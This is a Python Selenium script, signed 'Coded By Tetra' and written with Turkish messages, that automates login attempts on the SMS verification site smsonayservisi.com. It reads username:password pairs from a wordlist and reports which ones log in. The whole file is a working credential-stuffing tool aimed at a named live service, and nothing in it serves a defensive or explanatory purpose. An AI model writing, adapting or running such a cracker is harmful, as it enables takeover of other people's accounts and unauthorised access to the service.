#Coded By Tetra
from mimetypes import inited

from pywin.framework.toolmenu import idPos
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from colorama import  Fore , init
import  pyfiglet


def main():
    logo = pyfiglet.figlet_format("SMS ONAYLA")
    print(Fore.RED + logo)
    wordlist = input(f" {Fore.MAGENTA} \nWordlist Yolunu Girin: ")
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")

    driver = webdriver.Chrome(options=options)
    driver.get("https://smsonayservisi.com/")
    time.sleep(3)

    # Giriş Yap Butonuna Tıkla
    login_button = driver.find_element(By.XPATH, "//a[contains(text(),'Giriş Yap')]")
    login_button.click()

    def cracker():
        username_input = driver.find_element(By.XPATH, "//form[@action='/ajax/login']//input[@id='loginEmail']")
        password_input = driver.find_element(By.XPATH, "//input[@placeholder='Şifre']")

        try:
            with open(wordlist, "r") as file:
                oku = file.readlines()

                for urls in oku:
                    parcala = urls.strip().split(":")
                    if len(parcala) != 2:
                        print(f"{Fore.RED} [X]Hatalı Format: {urls.strip()}")
                        continue

                    username, passwords = parcala
                    username_input.send_keys(username)
                    password_input.send_keys(passwords)

                    try:
                        # Giriş yap butonuna tıkla
                        sumbit_button = WebDriverWait(driver, 10).until(
                            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Giriş Yap')]"))
                        )
                        sumbit_button.click()

                        # Hata mesajı çıkarsa kapat
                        try:
                            error_button = WebDriverWait(driver, 7).until(
                                EC.element_to_be_clickable((By.XPATH, "//button[normalize-space()='OK']"))
                            )
                            error_button.click()
                            print(f"{Fore.YELLOW}\nBaşarısız giriş: {username}:{passwords}")
                        except Exception:
                            print(f"{Fore.GREEN}\nBaşarılı giriş: {username}:{passwords}")
                            break  # Başarılı giriş sonrası döngüyü kır

                    except Exception as e:
                        print(f"{Fore.RED}Hata oluştu: {e}")

                    # Input alanlarını temizle
                    username_input.clear()
                    password_input.clear()

        except FileNotFoundError:
            print(f"{Fore.YELLOW}Belirtilen Dosya Yolu Bulunamadı.")
        except Exception as e:
            print(f"{Fore.BLUE}Bilinmeyen Hata: {e}")
        finally:
            driver.quit()

    cracker()

if __name__ == "__main__":
    main()
